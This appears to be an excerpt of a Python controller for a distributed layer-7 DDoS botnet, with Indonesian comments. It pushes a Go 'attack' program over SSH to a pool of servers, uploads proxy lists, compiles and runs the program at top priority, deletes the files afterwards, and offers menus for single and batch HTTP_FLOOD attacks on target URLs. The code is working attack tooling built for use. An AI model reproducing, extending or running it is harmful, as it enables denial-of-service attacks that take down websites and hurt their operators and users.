...
# ================= [ KONFIGURASI ] =================
DB_FILE = "servers.json"              # database yang sama dengan main.py
...
def deploy_attack(servers, target_url, duration, method, threads, use_proxy):
    """Deploy L7 attack to multiple servers"""
    ...
    # Calculate estimated power (rough)
    total_bw = sum([s.get('bandwidth', 100) for s in servers])
    est_rps = threads * 50 * len(servers)  # rough estimate
    ...
    def attack_server(server, index):
        ...
        # Prepare proxy file if needed (upload from local if exists)
        proxy_upload = ""
        if use_proxy:
            # Check if proxy.txt exists locally, upload it
            if os.path.exists('proxy.txt'):
                # Upload via scp using paramiko (we'll use heredoc with base64)
                with open('proxy.txt', 'r') as f:
                    proxy_data = f.read()
                # Escape for heredoc
                proxy_data_escaped = proxy_data.replace('EOF', 'ENDOFFILE')
                proxy_upload = f"""
                cat > /tmp/proxy.txt << 'PROXYEOF'
{proxy_data_escaped}
PROXYEOF
                """
            else:
                # Check if proxy.txt already exists on server
                proxy_upload = "if [ ! -f proxy.txt ]; then echo 'WARNING: proxy.txt not found, continuing without proxy'; fi"
        
        # Command to compile and run
        cmd = f"""
        mkdir -p /tmp/goattack
        {proxy_upload}
        cat > /tmp/goattack/attack.go << 'GOEOF'
{go_script}
GOEOF
        cd /tmp/goattack
        ...
        $GO_CMD get golang.org/x/net/http2 2>/dev/null
        $GO_CMD get golang.org/x/net/proxy 2>/dev/null
        ...
        if [ -f attack ]; then
            ...
            nice -n -20 ./attack
            rm -f attack attack.go go.mod go.sum
            cd /
        ...
        try:
            output = execute_ssh(server, cmd, timeout=duration+120)
            
            # Parse output for stats (from Go script)
            server_requests = 0
            server_bytes = 0
            avg_rps = 0
            avg_mbps = 0
            ...
            if match:
                requests_str = match.group(1)
                server_requests = parse_number(requests_str)
...
def menu_launch_attack(data):
    """Launch L7 attack with selectable server pool"""
    ...
    try:
        ...
        suggested = int(avg_cpu * 200)  # L7 uses more resources, so lower per core
        ...
        # Estimasi kekuatan
        est_rps = threads * 30 * len(servers)  # 30 RPS per thread
        est_mbps = (est_rps * 2048 * 8) / 1e6  # 2048 bytes average
...
def menu_batch_attack(data):
    ...
    print("Example: https://example.com/:60:HTTP_FLOOD")
